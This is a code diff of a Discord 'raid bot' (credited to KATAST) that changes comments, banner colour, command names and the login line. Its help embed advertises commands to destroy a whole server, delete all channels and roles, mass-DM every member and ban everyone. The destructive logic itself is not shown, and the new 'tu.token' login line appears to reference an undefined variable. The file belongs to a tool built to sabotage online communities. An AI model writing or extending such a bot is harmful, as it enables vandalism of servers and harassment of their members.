@@ -1,18 +1,18 @@
 const Discord = require('discord.js');
-const config = require("./config.json");
+const config = require("./config.json"); //Aquí se exporta config.json
 const client = new Discord.Client();
 const chalk = require('chalk');
 const fs = require('fs');
-const prefix = config.prefix
+const prefix = config.prefix //Aquí se define el prefix
 const {MessageEmbed} = require('discord.js')
 const EventEmitter = require('events');
 const emitter = new EventEmitter()
 emitter.setMaxListeners(50)
-const ownersid = config.ids;
+const ownersid = config.ids; //Aquí se definen las ids que están en config.json
 
 
   client.on('ready', () => {
-  console.log("\n██████╗░░█████╗░██╗██████╗░\n██╔══██╗██╔══██╗██║██╔══██╗\n██████╔╝███████║██║██║░░██║\n██╔══██╗██╔══██║██║██║░░██║\n██║░░██║██║░░██║██║██████╔╝\n╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░\n\n██████╗░░█████╗░████████╗\n██╔══██╗██╔══██╗╚══██╔══╝\n██████╦╝██║░░██║░░░██║░░░\n██╔══██╗██║░░██║░░░██║░░░\n██████╦╝╚█████╔╝░░░██║░░░\n╚═════╝░░╚════╝░░░░╚═╝░░░\nMADE BY KATAST.");  
+  console.log(chalk.red("\n██████╗░░█████╗░██╗██████╗░\n██╔══██╗██╔══██╗██║██╔══██╗\n██████╔╝███████║██║██║░░██║\n██╔══██╗██╔══██║██║██║░░██║\n██║░░██║██║░░██║██║██████╔╝\n╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░\n\n██████╗░░█████╗░████████╗\n██╔══██╗██╔══██╗╚══██╔══╝\n██████╦╝██║░░██║░░░██║░░░\n██╔══██╗██║░░██║░░░██║░░░\n██████╦╝╚█████╔╝░░░██║░░░\n╚═════╝░░╚════╝░░░░╚═╝░░░\nMADE BY KATAST."));  
   
   
   
@@ -32,7 +32,7 @@ client.on("message", message => {
 message.author.send({
   embed: {
     title: 'Destructor Comandos',
-    description: '**.on**\nDestruye todo el servidor por completo\n**.nuke**\nElimina todos los canales\n**.dr**\nElimina Los Roles.\n**.cr**\nCrea Roles.\n**.mdall**\nEnvia mensaje directo a todos los miembros.\n**.banall**\nNo creo que este comando necesite descripción.',
+    description: '**on**\nDestruye todo el servidor por completo\n**nuke**\nElimina todos los canales\n**dr**\nElimina Los Roles.\n**cr**\nCrea Roles.\n**mdall**\nEnvia mensaje directo a todos los miembros.\n**banall**\nNo creo que este comando necesite descripción.',
     image: {url: 'https://cdn.discordapp.com/attachments/1014221409368682506/1014221571444973639/20220826_084225.gif'},
     color: "000001"
   
@@ -255,4 +255,4 @@ require("http").createServer((_, res) => res.end("Bot Encendido.")).listen(8080)
         
         
         
-client.login(process.env['token'])
+client.login(tu.token)
